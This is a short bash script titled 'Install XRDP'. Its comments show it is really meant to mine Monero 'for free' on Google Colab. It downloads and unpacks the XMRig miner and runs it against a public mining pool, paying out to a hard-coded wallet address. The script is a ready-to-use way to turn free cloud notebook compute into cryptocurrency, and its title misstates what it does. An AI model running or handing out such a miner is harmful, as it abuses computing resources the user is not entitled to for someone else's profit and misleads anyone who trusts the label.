#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
tar xvzf xmrig-6.18.1-linux-static-x64.tar.gz
cd xmrig-6.18.1
./xmrig --verbose -o  xmrpool.eu:5555 -u 84vRNKF8eciVmcKycdZ675D3ZgZ963vFbiJ1DD7sRuwoEsemVLS7f9p53WLNMZVGeAWBxXqj7E8pUQXpNowwgx5TRcH1kb8 -k --tls -p a2nk
